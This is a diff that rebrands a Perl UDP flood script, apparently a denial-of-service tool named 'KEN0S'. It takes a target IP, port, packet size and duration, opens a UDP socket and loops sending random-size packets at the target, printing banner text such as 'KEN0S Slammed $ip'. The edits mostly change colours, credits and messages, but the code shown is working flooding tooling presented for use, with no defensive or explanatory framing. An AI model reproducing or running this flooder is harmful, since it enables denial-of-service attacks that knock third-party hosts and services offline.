@@ -1,5 +1,4 @@
-#!/usr/bin/perl
-
+#By DeaKenas / Github.com 
 use Term::ANSIColor qw(:constants);
     $Term::ANSIColor::AUTORESET = 2;
 
@@ -10,15 +9,15 @@ my ($ip,$port,$size,$time) = @ARGV;
 
 my ($iaddr,$endtime,$psize,$pport);
 
-$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+$iaddr = inet_aton("$ip") or die "Failed to slam $ip\n";
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-print BOLD RED<<EOTEXT;
+print BOLD CYAN<<EOTEXT;
 
 EOTEXT
 
-print color("cyan"), " ██ ▄█▀▓█████  ███▄    █  ▒█████    ██████ 
+print " ██ ▄█▀▓█████  ███▄    █  ▒█████    ██████ 
  ██▄█▒ ▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▒██    ▒ 
 ▓███▄░ ▒███   ▓██  ▀█ ██▒▒██░  ██▒░ ▓██▄   
 ▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░  ▒   ██▒
@@ -26,11 +25,11 @@ print color("cyan"), " ██ ▄█▀▓█████  ███▄    █  
 ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░░ ░    ░      ░   ░ ░ ░ ░ ░ ▒  ░  ░  ░  
-░  ░      ░  ░         ░     ░ ░        ░  ", color("reset");
-  ($port ? $port : "KEN0S Slammed $ip ")
-  ($size ? "$size-Slammed" : "65500") . " PPS: 63kbs" . 
+░  ░      ░  ░         ░     ░ ░        ░  
+    KEN0S Slammed $ip on port" . ($port ? $port : " ") . "  " . 
+  ($size ? "$size-Slammed" : " Port: 65500") . " PPS: 63kbps" . 
   ($time ? " for $time seconds" : "") . "\n";
-print "Stop slamming With Ctrl-C\n" unless $time;
+print "Stop NULLING With Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
